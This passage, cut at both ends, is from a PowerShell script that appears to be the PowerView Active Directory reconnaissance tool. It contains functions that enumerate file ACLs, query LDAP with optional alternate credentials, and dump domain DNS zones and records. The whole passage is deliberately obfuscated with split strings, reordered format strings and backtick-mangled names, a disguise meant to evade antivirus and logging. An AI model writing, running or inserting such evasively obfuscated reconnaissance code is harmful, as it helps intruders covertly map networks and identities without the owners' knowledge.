                [uint32](  "{1}{0}{2}" -f '9','0x0201','f' ) =  ("{1}{2}{0}" -f 'te','Read','AndWri')
                [uint32]("{2}{0}{1}" -f '0','20089','0x')   =  ( "{0}{1}" -f 'Re','ad' )
                [uint32](  "{0}{1}"-f'0x0','00116'  )  =  ( "{1}{0}" -f 'rite','W'  )
            }

            $Permissions  = @( )

            
            $Permissions += $SimplePermissions.keYS  |   ForEach-Object {
                              if (  ( $FSR -band $_ ) -eq $_) {
                                $SimplePermissions[$_]
                                $FSR  =  $FSR -band ( -not $_ )
                              }
                            }

            
            $Permissions += $AccessMask.KEys   |   Where-Object { $FSR -band $_ }   | ForEach-Object { $AccessMask[$_] }
            ( $Permissions   |   Where-Object {$_} ) -join ','
        }

        $ConvertArguments  =  @{}
        if (  $PSBoundParameters[(  "{1}{0}{2}"-f'red','C','ential' )]  ) { $ConvertArguments[("{1}{2}{0}"-f'tial','Cr','eden' )]  =  $Credential }

        $MappedComputers =  @{}
    }

    PROCESS {
        ForEach (  $TargetPath in $Path) {
            try {
                if (($TargetPath -Match ( ( ("{1}{4}{2}{0}{3}" -f 'er','3er3er3','3er3','.*','er3er.*'  )  )-CrepLaCe '3er',[CHar]92)) -and ($PSBoundParameters[(  "{2}{0}{1}" -f 'edent','ial','Cr')] ) ) {
                    $HostComputer  =   (New-Object ( 'Sys'+  'te' +  'm.U'  +'ri')(  $TargetPath )  ).HOsT
                    if (-not $MappedComputers[$HostComputer] ) {
                        
                        Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                        $MappedComputers[$HostComputer]  = $True
                    }
                }

                $ACL  = Get-Acl -Path $TargetPath

                $ACL.GEtaCceSsrUlES( $True, $True, [System.Security.Principal.SecurityIdentifier] )  |  ForEach-Object {
                    $SID = $_.idENTItYrEFerenCe.vALue
                    $Name   =  ConvertFrom-SID -ObjectSID $SID @ConvertArguments

                    $Out =  New-Object (  'PSObje'  +  'c'+ 't'  )
                    $Out  | Add-Member ( 'No'+'t' +  'ep'+'roperty') ( "{0}{1}" -f'Pa','th') $TargetPath
                    $Out  |  Add-Member (  'Notepro'  +'p'+'er'+ 'ty') (  "{0}{3}{1}{2}" -f'FileSy','em','Rights','st'  ) ( Convert-FileRight -FSR $_.FiLesYsTEmRigHTs.vaLUE__)
                    $Out  | Add-Member (  'N' +'otepr'+ 'ope'  + 'rty'  ) ( "{0}{3}{4}{5}{2}{1}" -f 'Ident','ce','ren','i','tyR','efe' ) $Name
                    $Out |   Add-Member ('Note' +  'prop'  +'erty' ) ("{3}{2}{1}{0}" -f 'D','tySI','denti','I' ) $SID
                    $Out  |   Add-Member (  'N' +  'ote' +  'pro'+  'perty'  ) ("{0}{2}{3}{1}" -f'A','pe','ccessContro','lTy') $_.AcceSScONTrOltYpe
                    $Out.pSOBJECt.TyPeNameS.InSERT( 0, ( "{2}{3}{0}{1}{4}" -f'erV','iew.FileA','Po','w','CL' ))
                    $Out
                }
            }
            catch {
                Write-Verbose (  '[Get-Pat'  +  'h'+ 'Acl' +  '] '+ 'e'+ 'rror:'+' ' + "$_")
            }
        }
    }

    END {
        
        $MappedComputers.keYs   |  Remove-RemoteConnection
    }
}


function COn`VerT-L`Da`PPr`OPEr`Ty {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{0}{4}{1}"-f 'ould','ess','PS','Sh','Proc'}, '' )]
    [OutputType( {"{3}{2}{6}{1}{0}{5}{7}{4}{8}"-f 't.','agemen','.M','System','n.PSCustomObjec','Automati','an','o','t'} )]
    [CmdletBinding( )]
    Param(  
        [Parameter(  mANdATory  =  $True, vALUEFROmpiPeLINe   =   $True )]
        [ValidateNotNullOrEmpty( )]
        $Properties
      )

    $ObjectProperties   = @{}

    $Properties.PropeRTYnaMes   |  ForEach-Object {
        if (  $_ -ne (  "{2}{0}{1}"-f'at','h','adsp'  ) ) {
            if (  ( $_ -eq ( "{2}{1}{0}" -f'd','tsi','objec')) -or ( $_ -eq (  "{1}{2}{0}"-f 'ry','s','idhisto')  ) ) {
                
                $ObjectProperties[$_]   =   $Properties[$_]  |   ForEach-Object { (  New-Object (  'Sy' +'stem.Se'  +  'c'+'urity.Principal.Securit' + 'yIdent' +  'if'  + 'i' +  'er' )(  $_, 0  )).Value }
            }
            elseif ($_ -eq ( "{2}{1}{0}"-f'uptype','ro','g' ) ) {
                $ObjectProperties[$_] =   $Properties[$_][0] -as $GroupTypeEnum
            }
            elseif ($_ -eq ( "{0}{1}{2}{3}"-f's','am','accounttyp','e'  ) ) {
                $ObjectProperties[$_]   =   $Properties[$_][0] -as $SamAccountTypeEnum
            }
            elseif (  $_ -eq (  "{2}{3}{0}{1}"-f 't','guid','obje','c' ) ) {
                
                $ObjectProperties[$_]  =  (  New-Object ('G' + 'uid' ) (  ,$Properties[$_][0])).gUid
            }
            elseif (  $_ -eq ( "{3}{0}{1}{2}" -f'era','ccou','ntcontrol','us' ) ) {
                $ObjectProperties[$_]  =  $Properties[$_][0] -as $UACEnum
            }
            elseif (  $_ -eq (  "{2}{3}{1}{0}{4}" -f'descript','ty','ntsecu','ri','or')  ) {
                
                $Descriptor =  New-Object ( 'Securit'  + 'y.AccessCont' + 'rol.' +  'Ra'  +  'wSecu'  + 'rityD'+  'esc' + 'riptor' ) -ArgumentList $Properties[$_][0], 0
                if (  $Descriptor.OWNeR) {
                    $ObjectProperties[("{0}{1}"-f'Owne','r')] =   $Descriptor.OWNeR
                }
                if (  $Descriptor.grOUP ) {
                    $ObjectProperties[(  "{1}{0}"-f'roup','G' )]  =  $Descriptor.group
                }
                if ($Descriptor.DisCRetioNaryAcl ) {
                    $ObjectProperties[( "{4}{1}{3}{0}{5}{2}" -f 're','i','onaryAcl','sc','D','ti')]  =   $Descriptor.dIscRETIonARyacl
                }
                if ($Descriptor.SySTEmacL ) {
                    $ObjectProperties[( "{2}{1}{0}"-f 'cl','A','System')]   =  $Descriptor.SystEMaCl
                }
            }
            elseif ( $_ -eq ( "{0}{3}{1}{2}" -f 'accoun','ire','s','texp'  )) {
                if ($Properties[$_][0] -gt [DateTime]::MaxvAlUe.tiCKs ) {
                    $ObjectProperties[$_]   =  (  "{0}{1}" -f'N','EVER')
                }
                else {
                    $ObjectProperties[$_]  = [datetime]::fRomFILETIME($Properties[$_][0] )
                }
            }
            elseif (  ( $_ -eq ( "{1}{0}{2}" -f'logo','last','n'  ) ) -or (  $_ -eq ( "{3}{4}{5}{0}{1}{2}" -f'ont','ime','stamp','last','l','og')  ) -or ($_ -eq ("{1}{0}{2}"-f'st','pwdla','set'  ) ) -or ($_ -eq (  "{1}{2}{0}"-f'ff','la','stlogo'  ) ) -or (  $_ -eq ( "{0}{3}{1}{2}"-f 'badPa','ordTi','me','ssw' )  )  ) {
                
                if (  $Properties[$_][0] -is [System.MarshalByRefObject] ) {
                    
                    $Temp  =   $Properties[$_][0]
                    [Int32]$High  =   $Temp.GettYpe().inVoKemeMbER(  (  "{1}{0}{2}"-f 'P','High','art'), [System.Reflection.BindingFlags]::gEtpropeRtY, $Null, $Temp, $Null )
                    [Int32]$Low   =  $Temp.getTYPE( ).INvokemeMBEr( ("{1}{2}{0}" -f 'Part','L','ow'),  [System.Reflection.BindingFlags]::GEtPrOPerTy, $Null, $Temp, $Null)
                    $ObjectProperties[$_]  = ([datetime]::FromfiletIme( [Int64](  "0x{0:x8}{1:x8}" -f $High, $Low ))  )
                }
                else {
                    
                    $ObjectProperties[$_]   = ([datetime]::FROmfILetIMe(  (  $Properties[$_][0]  )))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject] ) {
                
                $Prop =   $Properties[$_]
                try {
                    $Temp =   $Prop[$_][0]
                    [Int32]$High =  $Temp.GeTtype( ).inVOKemEMBer( ( "{0}{1}{2}" -f 'Hi','ghP','art' ), [System.Reflection.BindingFlags]::geTpRopeRtY, $Null, $Temp, $Null)
                    [Int32]$Low  =  $Temp.GeTtYpe(   ).InvOKemeMBeR( ( "{1}{0}" -f'art','LowP'  ),  [System.Reflection.BindingFlags]::GetproPeRty, $Null, $Temp, $Null)
                    $ObjectProperties[$_]   =  [Int64]("0x{0:x8}{1:x8}" -f $High, $Low  )
                }
                catch {
                    Write-Verbose ( '[Co'+ 'nve'+ 'rt-'  +  'L'+ 'DAPProperty'  +  ']' +  ' '  + 'erro'+  'r:'  +  ' ' +"$_" )
                    $ObjectProperties[$_]   =  $Prop[$_]
                }
            }
            elseif ($Properties[$_].cOUnt -eq 1 ) {
                $ObjectProperties[$_]  =   $Properties[$_][0]
            }
            else {
                $ObjectProperties[$_]   = $Properties[$_]
            }
        }
    }
    try {
        New-Object -TypeName (  'P'  +'SOb'+ 'ject' ) -Property $ObjectProperties
    }
    catch {
        Write-Warning (  '[C' +  'on' +'ve'+  'rt-L'+ 'DAPPrope' + 'rty' +  '] '+ 'E'+ 'r'+'ror '+ 'parsin'  +  'g'+  ' ' + 'LD'+  'AP '  + 'pr' +'o'+ 'perti' +'es ' +': '+  "$_"  )
    }
}








function GEt-Do`Mai`Ns`EArcher {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{0}{4}{1}{2}{3}"-f 'P','ould','Proces','s','SSh'}, '')]
    [OutputType(  {"{2}{0}{1}{4}{5}{3}{6}"-f'st','em.Dire','Sy','s.Dir','c','toryService','ectorySearcher'})]
    [CmdletBinding(  )]
    Param(  
        [Parameter( valuefrOmPIpeLiNE =  $True  )]
        [ValidateNotNullOrEmpty(  )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(   )]
        [Alias( {"{0}{2}{1}" -f'F','er','ilt'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty(  )]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty(    )]
        [Alias({"{2}{1}{0}"-f 'SPath','D','A'} )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(    )]
        [String]
        $SearchBasePrefix,

        [ValidateNotNullOrEmpty(   )]
        [Alias(  {"{4}{3}{2}{1}{0}" -f 'r','e','ntroll','ainCo','Dom'} )]
        [String]
        $Server,

        [ValidateSet(  {"{1}{0}"-f'e','Bas'}, {"{0}{1}" -f'OneL','evel'}, {"{1}{0}" -f'e','Subtre'}  )]
        [String]
        $SearchScope =  ( "{0}{1}" -f 'Su','btree'),

        [ValidateRange( 1, 10000)]
        [Int]
        $ResultPageSize  = 200,

        [ValidateRange(1, 10000 )]
        [Int]
        $ServerTimeLimit =   120,

        [ValidateSet( {"{1}{0}"-f 'cl','Da'}, {"{1}{0}" -f'up','Gro'}, {"{0}{1}"-f 'No','ne'}, {"{0}{1}"-f 'O','wner'}, {"{0}{1}"-f 'Sac','l'})]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential  = [Management.Automation.PSCredential]::EMpTY
     )

    PROCESS {
        if ( $PSBoundParameters[( "{1}{0}" -f 'n','Domai' )]) {
            $TargetDomain   = $Domain

            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.triM(  ) -ne '' )  ) {
                
                $UserDomain  = $ENV:USERDNSDOMAIN
                if (  $ENV:LOGONSERVER -and (  $ENV:LOGONSERVER.triM(  ) -ne '') -and $UserDomain) {
                    $BindServer =   "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif ( $PSBoundParameters[(  "{2}{0}{1}"-f 'entia','l','Cred' )] ) {
            
            $DomainObject  =   Get-Domain -Credential $Credential
            $BindServer = ($DomainObject.PDCROLeOWneR).nAME
            $TargetDomain  = $DomainObject.NamE
        }
        elseif (  $ENV:USERDNSDOMAIN -and (  $ENV:USERDNSDOMAIN.TRim(  ) -ne '')  ) {
            
            $TargetDomain  =   $ENV:USERDNSDOMAIN
            if (  $ENV:LOGONSERVER -and (  $ENV:LOGONSERVER.TRiM(  ) -ne '' ) -and $TargetDomain) {
                $BindServer  =  "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            
            write-verbose ("{1}{0}{2}" -f '-doma','get','in'  )
            $DomainObject   =  Get-Domain
            $BindServer =  (  $DomainObject.pdCROleOWNer).NAmE
            $TargetDomain  =   $DomainObject.namE
        }

        if ($PSBoundParameters[(  "{2}{1}{0}"-f'er','rv','Se')]  ) {
            
            $BindServer   =   $Server
        }

        $SearchString = ("{2}{1}{0}"-f '//','DAP:','L'  )

        if (  $BindServer -and ($BindServer.trim(   ) -ne ''  ) ) {
            $SearchString += $BindServer
            if ( $TargetDomain) {
                $SearchString += '/'
            }
        }

        if (  $PSBoundParameters[(  "{2}{3}{0}{1}" -f 'ePr','efix','Sea','rchBas')]) {
            $SearchString += $SearchBasePrefix   +  ','
        }

        if (  $PSBoundParameters[("{0}{2}{1}"-f'Se','chBase','ar')] ) {
            if ( $SearchBase -Match ("{1}{0}" -f '/','^GC:/'  )) {
                
                $DN   =  $SearchBase.TOUPPeR( ).trIm('/')
                $SearchString   =  ''
            }
            else {
                if (  $SearchBase -match ( "{1}{2}{0}"-f 'DAP://','^','L') ) {
                    if (  $SearchBase -match (  "{2}{1}{0}"-f'/.+','AP://.+','LD'  )  ) {
                        $SearchString  =  ''
                        $DN =   $SearchBase
                    }
                    else {
                        $DN  = $SearchBase.SubsTrING(7  )
                    }
                }
                else {
                    $DN =  $SearchBase
                }
            }
        }
        else {
            
            if (  $TargetDomain -and ( $TargetDomain.tRiM() -ne '' )  ) {
                $DN  =  "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        $SearchString += $DN
        Write-Verbose ( '[Get-Dom'  +  'a' + 'inS'  +'ea'+'rc'+ 'he'+  'r] '  + 'searc'+ 'h '+ 'ba'+  'se: ' +  "$SearchString" )

        if ( $Credential -ne [Management.Automation.PSCredential]::EMptY  ) {
            Write-Verbose ("{17}{0}{10}{3}{4}{7}{15}{9}{6}{16}{8}{5}{1}{12}{2}{14}{11}{13}" -f 'Get','r LD',' ','inSearcher','] ','ls fo','c','Us','a',' ','-Doma','io','AP','n','connect','ing alternate','redenti','['  )
            
            $DomainObject  =   New-Object ( 'Di' + 'rector' +'yServices.Dir'  + 'ector'  + 'yE'  +  'ntry')(  $SearchString, $Credential.uSERname, $Credential.GEtNetwORkcrEDeNTIal().PaSsWoRD)
            $Searcher = New-Object ('Syste'+'m.Di'  +'rect'  + 'or' + 'yServices' + '.D' + 'irect'  + 'orySe' + 'archer' )( $DomainObject )
        }
        else {
            
            $Searcher   =   New-Object ('System.Direct'  + 'oryS'+  'ervice'+ 's.'+'Dire'  +'ctor'  +'y' +'Sear' + 'cher'  )( [ADSI]$SearchString  )
        }

        $Searcher.PAgEsizE  = $ResultPageSize
        $Searcher.SEarchSCOpE   = $SearchScope
        $Searcher.CacherEsuLts = $False
        $Searcher.ReferralcHAsing =   [System.DirectoryServices.ReferralChasingOption]::all

        if ($PSBoundParameters[(  "{0}{4}{2}{3}{1}" -f 'S','imit','im','eL','erverT')]) {
            $Searcher.SERVErTiMElimit   =   $ServerTimeLimit
        }

        if ($PSBoundParameters[("{0}{2}{1}" -f'Tom','stone','b'  )]  ) {
            $Searcher.TOmBSTONe  =   $True
        }

        if ($PSBoundParameters[("{2}{0}{1}"-f'APF','ilter','LD' )]  ) {
            $Searcher.fILtER  =   $LDAPFilter
        }

        if ( $PSBoundParameters[("{2}{0}{1}{3}"-f'Mas','k','Security','s' )]) {
            $Searcher.secUrItYMasKS  =  Switch ($SecurityMasks  ) {
                ("{0}{1}" -f 'D','acl') { [System.DirectoryServices.SecurityMasks]::DACL }
                ( "{0}{1}" -f 'Gr','oup' ) { [System.DirectoryServices.SecurityMasks]::gROuP }
                ("{1}{0}" -f 'e','Non'  ) { [System.DirectoryServices.SecurityMasks]::NOne }
                ("{0}{1}" -f 'Own','er' ) { [System.DirectoryServices.SecurityMasks]::OWNEr }
                ("{1}{0}" -f 'l','Sac'  ) { [System.DirectoryServices.SecurityMasks]::SaCl }
            }
        }

        if ($PSBoundParameters[(  "{0}{1}{2}" -f 'Proper','ti','es'  )]  ) {
            
            $PropertiesToLoad  = $Properties| ForEach-Object { $_.spLiT(','  ) }
            $Null   = $Searcher.proPerTIEStoloAd.ADDRANge( (  $PropertiesToLoad) )
        }

        $Searcher
    }
}


function cO`NVeR`T-DN`SREcOrD {


    [OutputType( {"{1}{8}{7}{6}{9}{0}{3}{2}{4}{5}" -f 'SC','Sy','s','u','tomObjec','t','ent.Automatio','anagem','stem.M','n.P'} )]
    [CmdletBinding(  )]
    Param(
        [Parameter(PosiTion  =  0, mAnDATORy   = $True, ValUefrOMPipelInebyPrOpERtYnAMe = $True)]
        [Byte[]]
        $DNSRecord
    )

    BEGIN {
        function Get`-na`me {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{1}{7}{0}{3}{6}{4}{5}{2}" -f'pu','PSUse','tly','tT','eCor','rec','yp','Out'}, ''  )]
            [CmdletBinding(  )]
            Param(
                [Byte[]]
                $Raw
             )

            [Int]$Length   =  $Raw[0]
            [Int]$Segments  =  $Raw[1]
            [Int]$Index =  2
            [String]$Name    =   ''

            while (  $Segments-- -gt 0  )
            {
                [Int]$SegmentLength =  $Raw[$Index++]
                while ($SegmentLength-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS {
        
        $RDataType   =  [BitConverter]::tOUINT16(  $DNSRecord, 2  )
        $UpdatedAtSerial = [BitConverter]::tOUINt32($DNSRecord, 8 )

        $TTLRaw  = $DNSRecord[12..15]

        
        $Null   = [array]::reverSe(  $TTLRaw)
        $TTL  = [BitConverter]::TOUiNt32( $TTLRaw, 0 )

        $Age  = [BitConverter]::tOuInT32( $DNSRecord, 20)
        if ($Age -ne 0 ) {
            $TimeStamp  =   ( ( Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0 ).addHoURs( $age  )).TOString( )
        }
        else {
            $TimeStamp  = (  "{1}{0}"-f'tatic]','[s' )
        }

        $DNSRecordObject   =   New-Object ( 'PS' + 'Objec' +  't'  )

        if (  $RDataType -eq 1) {
            $IP =   "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
            $Data  =   $IP
            $DNSRecordObject   |   Add-Member ('Notep'+ 'roper'  +  'ty' ) ("{2}{1}{3}{0}" -f'e','y','RecordT','p') 'A'
        }

        elseif ( $RDataType -eq 2) {
            $NSName   =   Get-Name $DNSRecord[24..$DNSRecord.lENgTh]
            $Data = $NSName
            $DNSRecordObject |   Add-Member (  'No' + 'tepropert'+  'y'  ) (  "{2}{0}{1}"-f 'ecordTyp','e','R'  ) 'NS'
        }

        elseif ( $RDataType -eq 5  ) {
            $Alias = Get-Name $DNSRecord[24..$DNSRecord.lENgTh]
            $Data =  $Alias
            $DNSRecordObject   |  Add-Member (  'N'  +  'ot' +'eproperty'  ) (  "{0}{1}{2}" -f 'Recor','dT','ype') ("{1}{0}" -f 'ME','CNA')
        }

        elseif ( $RDataType -eq 6) {
            
            $Data  =  $([System.Convert]::ToBAse64STRiNG($DNSRecord[24..$DNSRecord.LEngtH]))
            $DNSRecordObject  | Add-Member (  'No'+'teprop'+'e'+'rty' ) ("{1}{0}{2}" -f 'ordT','Rec','ype' ) 'SOA'
        }

        elseif ($RDataType -eq 12 ) {
            $Ptr   = Get-Name $DNSRecord[24..$DNSRecord.LeNgth]
            $Data  =   $Ptr
            $DNSRecordObject |  Add-Member ( 'Note'+ 'prop'+  'ert' +  'y'  ) ("{1}{2}{0}" -f 'e','Recor','dTyp') 'PTR'
        }

        elseif ( $RDataType -eq 13) {
            
            $Data = $([System.Convert]::TObAse64strIng( $DNSRecord[24..$DNSRecord.LengtH] )  )
            $DNSRecordObject  | Add-Member ( 'Note' + 'p' +'roperty') (  "{2}{0}{1}{3}"-f 'ec','ord','R','Type') (  "{0}{1}" -f 'HIN','FO'  )
        }

        elseif ($RDataType -eq 15) {
            
            $Data = $([System.Convert]::TObasE64sTRinG($DNSRecord[24..$DNSRecord.LenGTh] )  )
            $DNSRecordObject  | Add-Member ( 'No'  +'tepr'  + 'op'  + 'erty'  ) (  "{0}{1}{2}" -f'Rec','ordT','ype') 'MX'
        }

        elseif ( $RDataType -eq 16  ) {
            [string]$TXT    =   ''
            [int]$SegmentLength =   $DNSRecord[24]
            $Index = 25

            while ( $SegmentLength-- -gt 0) {
                $TXT += [char]$DNSRecord[$index++]
            }

            $Data = $TXT
            $DNSRecordObject   |  Add-Member (  'No'+  't'  +  'eprope'  +'rty'  ) (  "{1}{2}{0}"-f'dType','R','ecor') 'TXT'
        }

        elseif ($RDataType -eq 28) {
            
            $Data =  $([System.Convert]::tObAsE64StrinG( $DNSRecord[24..$DNSRecord.LeNgTH]  ) )
            $DNSRecordObject   | Add-Member (  'Note'  + 'pro'+ 'pert' +'y'  ) ("{1}{0}{2}"-f 'cordTy','Re','pe' ) ( "{1}{0}"-f'A','AAA' )
        }

        elseif (  $RDataType -eq 33) {
            
            $Data   = $([System.Convert]::TOBASe64sTRiNg(  $DNSRecord[24..$DNSRecord.Length]  ) )
            $DNSRecordObject   | Add-Member ('N'  + 'otepro' +'p'  +'erty') ("{2}{0}{1}" -f 'ecordTyp','e','R'  ) 'SRV'
        }

        else {
            $Data  =   $([System.Convert]::TObAse64STrINg( $DNSRecord[24..$DNSRecord.lengTH])  )
            $DNSRecordObject   |   Add-Member ( 'Notep' + 'r'+'ope' + 'rty'  ) (  "{0}{2}{1}"-f 'Recor','Type','d' ) (  "{1}{0}" -f 'OWN','UNKN'  )
        }

        $DNSRecordObject |   Add-Member (  'Not'  + 'e' +  'prope'  +'rty') ("{1}{0}{2}{3}"-f 'date','Up','dAtSeri','al' ) $UpdatedAtSerial
        $DNSRecordObject  |   Add-Member (  'No'+  'tepro'+ 'perty') 'TTL' $TTL
        $DNSRecordObject  | Add-Member ('Not'  +'eproper' + 't'  +'y'  ) 'Age' $Age
        $DNSRecordObject   | Add-Member ( 'N'+ 'otepr'+  'operty'  ) ("{1}{0}" -f 'Stamp','Time'  ) $TimeStamp
        $DNSRecordObject  |  Add-Member (  'Not'+'eproper' +'ty') ("{1}{0}"-f 'ata','D' ) $Data
        $DNSRecordObject
    }
}


function ge`T-DOMaInDn`s`Z`oNe {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{2}{1}{0}" -f 'ss','Proce','ld','hou','PSS'}, ''  )]
    [OutputType({"{0}{3}{4}{2}{1}"-f 'Pow','ne','Zo','erView','.DNS'} )]
    [CmdletBinding( )]
    Param( 
        [Parameter(  positIoN  =  0, vaLUeFRompiPELinE   =   $True)]
        [ValidateNotNullOrEmpty( )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(  )]
        [Alias({"{1}{0}{3}{2}{4}"-f'inCon','Doma','ll','tro','er'})]
        [String]
        $Server,

        [ValidateNotNullOrEmpty(    )]
        [String[]]
        $Properties,

        [ValidateRange( 1, 10000 )]
        [Int]
        $ResultPageSize  =  200,

        [ValidateRange(  1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias( {"{1}{3}{0}{2}" -f 'turnOn','R','e','e'} )]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential  =   [Management.Automation.PSCredential]::empTY
    )

    PROCESS {
        $SearcherArguments   =  @{
            ( "{2}{1}{3}{0}" -f'er','DAP','L','Filt')  = ( "{0}{3}{2}{1}"-f '(objectCla','e)','on','ss=dnsZ'  )
        }
        if ( $PSBoundParameters[("{1}{0}" -f 'ain','Dom')]) { $SearcherArguments[(  "{1}{0}" -f'main','Do' )]  =   $Domain }
        if ( $PSBoundParameters[(  "{0}{1}{2}" -f'Se','rve','r' )]  ) { $SearcherArguments[("{1}{0}"-f'r','Serve' )]  = $Server }
        if ( $PSBoundParameters[( "{0}{2}{1}"-f'Pr','perties','o'  )] ) { $SearcherArguments[( "{2}{1}{0}" -f'es','perti','Pro' )]  = $Properties }
        if (  $PSBoundParameters[("{2}{3}{0}{1}" -f 'Pag','eSize','R','esult')]  ) { $SearcherArguments[("{1}{3}{0}{2}{4}" -f 'Pa','Resul','geSi','t','ze' )] =  $ResultPageSize }
        if ($PSBoundParameters[("{0}{3}{1}{2}"-f'Se','verTimeLim','it','r'  )] ) { $SearcherArguments[( "{3}{1}{0}{2}" -f'imeLimi','erT','t','Serv')]   =  $ServerTimeLimit }
        if ($PSBoundParameters[(  "{0}{2}{1}"-f 'C','al','redenti')] ) { $SearcherArguments[( "{0}{3}{2}{1}"-f 'C','l','ntia','rede'  )] =  $Credential }
        $DNSSearcher1 = Get-DomainSearcher @SearcherArguments

        if (  $DNSSearcher1 ) {
            if (  $PSBoundParameters[(  "{2}{1}{0}" -f'e','ndOn','Fi')]  ) { $Results = $DNSSearcher1.FINdONE(  )  }
            else { $Results   =   $DNSSearcher1.FIndaLl( ) }
            $Results  |   Where-Object {$_} | ForEach-Object {
                $Out   =  Convert-LDAPProperty -Properties $_.PropertiEs
                $Out   |   Add-Member ('NotePr'  +'o' +'pert' + 'y' ) (  "{0}{1}"-f 'Zon','eName' ) $Out.nAME
                $Out.PsoBjecT.typenAMEs.inSeRT(0, ("{0}{1}{2}{3}" -f 'PowerView.','DNS','Zo','ne'  )  )
                $Out
            }

            if (  $Results) {
                try { $Results.DISpOSE(  ) }
                catch {
                    Write-Verbose ( '[Get-D' + 'o'+ 'm' + 'ainDFS'  + 'Share] '  +'Er' + 'ror '+ 'd'  +  'i' +'sposing '+'of'+  ' '  +'t'+'he '+ 'R' + 'es' +  'ults '  +  'o' + 'bject: '+ "$_"  )
                }
            }
            $DNSSearcher1.diSPosE(  )
        }

        $SearcherArguments[("{3}{5}{1}{0}{2}{4}"-f 'a','hB','sePref','Sea','ix','rc')]  =  ( "{7}{0}{2}{1}{8}{6}{3}{5}{4}"-f'=Micro','ftDN','so','Z','es','on','Dns','CN','S,DC=Domain')
        $DNSSearcher2  =  Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher2 ) {
            try {
                if ( $PSBoundParameters[("{0}{1}"-f'Fin','dOne'  )]) { $Results   = $DNSSearcher2.fiNDoNE(    ) }
                else { $Results =  $DNSSearcher2.fINdAlL( ) }
                $Results  | Where-Object {$_}  |   ForEach-Object {
                    $Out =  Convert-LDAPProperty -Properties $_.prOPeRtiES
                    $Out |   Add-Member ('Note' +  'P' +  'ropert' +  'y' ) ( "{1}{0}"-f 'e','ZoneNam'  ) $Out.NamE
                    $Out.PSObjECT.TYpEnamES.INsErT(0, ("{4}{0}{1}{3}{2}" -f'er','View','Zone','.DNS','Pow')  )
                    $Out
                }
                if ($Results  ) {
                    try { $Results.DISPOsE() }
                    catch {
                        Write-Verbose ( '[Ge' + 't-'+  'D'+'omain' +'DN'  + 'SZone] '+'Error'+ ' ' +'di'+'sp'+'osing '+  'of' + ' '+ 'the'+  ' ' + 'Results' +  ' '+  'o' + 'bject: '  +  "$_"  )
                    }
                }
            }
            catch {
                Write-Verbose ((("{10}{0}{5}{15}{9}{1}{4}{3}{16}{11}{8}{2}{13}{7}{14}{12}{6}" -f'o',' Error acces','tD','ng W','si','mai','nesWRD','S,','crosof','SZone]','[Get-D','CN=Mi','omainDnsZo','N','DC=D','nDN','RD' ) ).RePLAce(  'WRD',[StRING][ChAr]39  ))
            }
            $DNSSearcher2.dIspOse(  )
        }
    }
}


function g`et`-dOMaInD`NS`ReCORd {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}"-f'PSShouldPro','c','ess'}, '' )]
    [OutputType( {"{0}{2}{3}{4}{1}"-f 'Po','ecord','w','erV','iew.DNSR'}  )]
    [CmdletBinding(  )]
    Param( 
        [Parameter(  posiTiOn  = 0,  MaNdatoRy   =  $True, vALuEFrOmPiPElIne = $True, vAluefRomPIpelINEByPRoPERTyNAmE  = $True )]
        [ValidateNotNullOrEmpty(   )]
        [String]
        $ZoneName,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(  )]
        [Alias( {"{2}{3}{0}{1}"-f 'Control','ler','Domai','n'})]
        [String]
        $Server,

        [ValidateNotNullOrEmpty(    )]
        [String[]]
        $Properties  =   (  "{3}{12}{9}{5}{7}{13}{6}{10}{11}{4}{1}{0}{2}{8}"-f'a','ncre','ted,when','n','he','s','nguish','t','changed','i','ed','name,dnsrecord,w','ame,d','i' ),

        [ValidateRange(1, 10000  )]
        [Int]
        $ResultPageSize =   200,

        [ValidateRange(1, 10000  )]
        [Int]
        $ServerTimeLimit,

        [Alias( {"{0}{1}" -f'ReturnOn','e'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential = [Management.Automation.PSCredential]::emPTy
    )

    PROCESS {
        $SearcherArguments = @{
            ( "{2}{0}{1}"-f 'Fil','ter','LDAP')  =   (( "{5}{0}{2}{4}{1}{3}" -f 'jectCl','o','as','de)','s=dnsN','(ob') )
            (  "{1}{2}{3}{0}"-f 'x','Sea','rchBaseP','refi'  )  = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ( $PSBoundParameters[(  "{1}{0}{2}"-f 'oma','D','in')]) { $SearcherArguments[( "{0}{1}"-f'Do','main'  )]  = $Domain }
        if ( $PSBoundParameters[("{1}{2}{0}"-f'ver','Se','r')]) { $SearcherArguments[("{2}{1}{0}"-f'r','e','Serv'  )] =   $Server }
